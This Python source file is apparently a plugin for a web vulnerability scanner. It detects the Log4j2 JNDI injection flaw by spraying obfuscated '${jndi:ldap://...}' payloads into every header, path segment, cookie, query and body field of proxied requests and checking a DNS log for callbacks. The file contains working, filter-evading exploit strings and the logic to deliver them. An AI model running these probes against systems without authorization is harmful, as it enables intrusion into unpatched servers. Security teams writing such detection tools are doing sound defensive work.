#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

from copy import deepcopy
from mitmproxy.http import HTTPFlow
from lib.core.enums import AddonType
from lib.core.enums import VulType
from lib.core.enums import VulLevel
from addon.agent import AgentAddon
from lib.util.util import random_lowercase_digits
from lib.util.aiohttputil import ClientSession

class Addon(AgentAddon):
    """
    log4j 扫描
    """

    def __init__(self):
        AgentAddon.__init__(self)
        self.name = 'Log4j2Deserialization'
        self.addon_type = AddonType.URL_ONCE
        self.vul_name = "Log4j2反序列化漏洞"
        self.level = VulLevel.HIGH
        self.vul_type = VulType.RCE
        self.description = "反序列化漏洞是特殊的任意代码执行漏洞，通常出现在Java环境。漏洞产生原因主要是暴露了反序列化操作API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。在Java编码过程应使用最新版本的组件lib包。特别注意升级，如：Apache Commons Collections、fastjson、Jackson等出现过问题的组件。"
        self.scopen = ""
        self.impact = "1. Log4j2低版本存在反序列化漏洞，导致可以远程命令执行。"
        self.suggestions = "1. 升级Log4j2至最新版本。"
        self.mark = ""
        self.dnslog_domain = '{value}.l42.' + self.dnslog_top_domain
        self.payloads = [
            # "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{dnslog}/test9}",
            # "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{dnslog}/test11}",
            # "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://{dnslog}/test10}",
            # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-l}${env:aaaa:-d}${env:aaaa:-a}${env:aaaa:-p}${env:aaaa:-:}//{dnslog}/test5}",
            # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-r}${env:aaaa:-m}${env:aaaa:-i}${env:aaaa:-:}//{dnslog}/test6}",
            # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-d}${env:aaaa:-n}${env:aaaa:-s}${env:aaaa:-:}//{dnslog}/test7}",
            "${a:-${a:-$${a:-${a:-$${j$${a:-}nd${a:-}i:l${a:-}da${a:-}p://{dnslog}/test$${a:-}}}}}}",
            # "${j${a:-}ndi:ld${a:-}ap://{dnslog}/test${a:-}}",
        ]
        self.black_media_type_list = ["image", "video", "audio"]
        self.black_ext_list = ['jpg', 'png', 'pdf', 'png', 'docx', 'doc', 'jpeg', 'xlsx', 'csv', 'js', 'css',  'map', 'json', 'txt']
        self.black_headers_list = ["Cookie", "Origin", "Connection", "Accept-Encoding", "Accept-Language",
                                   "Accept", "Upgrade-Insecure-Requests", "Sec-Fetch-Site", "Sec-Fetch-Mode",
                                   "Sec-Fetch-Dest", "Sec-Fetch-User", "If-None-Match", "DNT",
                                   "X-Requested-With", "Cache-Control", "content-encoding", "If-Modified-Since"]

    async def generate_payload(self, text=None):
        for payload in self.payloads:
            dnslog = self.dnslog_domain.format(value=random_lowercase_digits())
            payload = payload.replace('{dnslog}', dnslog)
            yield payload, dnslog

    async def prove(self, flow: HTTPFlow):
        method = self.get_method(flow)
        ext = self.get_extension(flow)
        response_media_type = self.get_response_media_type(flow)
        if method in ['GET', 'POST'] and response_media_type not in self.black_media_type_list and ext not in self.black_ext_list:
            url = self.get_url(flow)
            query = self.get_query(flow)
            url_no_query = self.get_url_no_query(flow)
            data = self.get_request_content(flow)
            cookies = self.get_request_cookies(flow)
            boundary = self.get_request_boundary(flow)
            headers = self.get_request_headers(flow)
            path_component = self.get_path_component(flow)
            base_url = self.get_base_url(flow)

            # 替换headers参数
            for header_key, header_value in headers.items():
                if header_key not in self.black_headers_list:
                    test_headers = deepcopy(headers)
                    async for payload, keyword in self.generate_payload():
                        test_headers[header_key] = payload
                        if await self.prove_log4j(keyword, method, url, data, test_headers):
                            return

            # 替换path参数
            for i in range(0, len(path_component)):
                async for payload, keyword in self.generate_payload():
                    temp_path_component = deepcopy(path_component)
                    temp_path_component[i] = payload
                    temp_path = '/'.join(temp_path_component)
                    test_url = f'{base_url}{temp_path}?{query}'
                    if await self.prove_log4j(keyword, method, test_url, data, headers):
                        return

            # 替换cookies参数
            test_headers = deepcopy(headers)
            for cookie_key, cookie_value in cookies.items():
                test_cookie = deepcopy(cookies)
                source_parameter_dic = self.parser_parameter(cookie_value)
                async for res_function_result in self.generate_parameter_dic_by_function(source_parameter_dic, self.generate_payload):
                    temp_parameter_dic = res_function_result[0]
                    keyword = res_function_result[1]
                    temp_content, temp_boundary = self.generate_content(temp_parameter_dic)
                    test_cookie[cookie_key] = str(temp_content, encoding='utf-8')
                    test_headers['Cookie'] = test_cookie
                    if await self.prove_log4j(keyword, method, url, data, test_headers):
                        return

            # 替换query参数
            source_parameter_dic = self.parser_parameter(query)
            async for res_function_result in self.generate_parameter_dic_by_function(source_parameter_dic, self.generate_payload):
                temp_parameter_dic = res_function_result[0]
                keyword = res_function_result[1]
                temp_content, temp_boundary = self.generate_content(temp_parameter_dic)
                test_url = url_no_query + '?' + str(temp_content, encoding="utf-8")
                if await self.prove_log4j(keyword, method, test_url, data, headers):
                    return

            # 替换body参数
            source_parameter_dic = self.parser_parameter(data, boundary)
            async for res_function_result in self.generate_parameter_dic_by_function(source_parameter_dic, self.generate_payload):
                temp_parameter_dic = res_function_result[0]
                keyword = res_function_result[1]
                temp_content, temp_boundary = self.generate_content(temp_parameter_dic)
                test_data = temp_content
                if await self.prove_log4j(keyword, method, url, test_data, headers):
                    return

            # 单发一个带x-forwarded-for的随机header
            if "X-Forwarded-For" not in headers.keys():
                async for payload, keyword in self.generate_payload():
                    temp_headers = deepcopy(headers)
                    temp_headers["X-Forwarded-For"] = payload
                    if await self.prove_log4j(keyword, method, url, data, temp_headers):
                        return

            # 补充测试content-type
            if "Content-Type" not in headers.keys():
                async for payload, keyword in self.generate_payload():
                    temp_headers = deepcopy(headers)
                    temp_headers["Content-Type"] = payload
                    if await self.prove_log4j(keyword, method, url, data, temp_headers):
                        return


    async def prove_log4j(self, keyword, method, url, data, headers):
        async with ClientSession(self.addon_path) as session:
            async with session.request(method, url, keyword=keyword, data=data, headers=headers, allow_redirects=False) as res:
                if res:
                    if await self.get_dnslog_recode(keyword):
                        detail = f"Add from dnslog, Keyword: {keyword}"
                        await self.save_vul(res, detail)
                        return True
        return False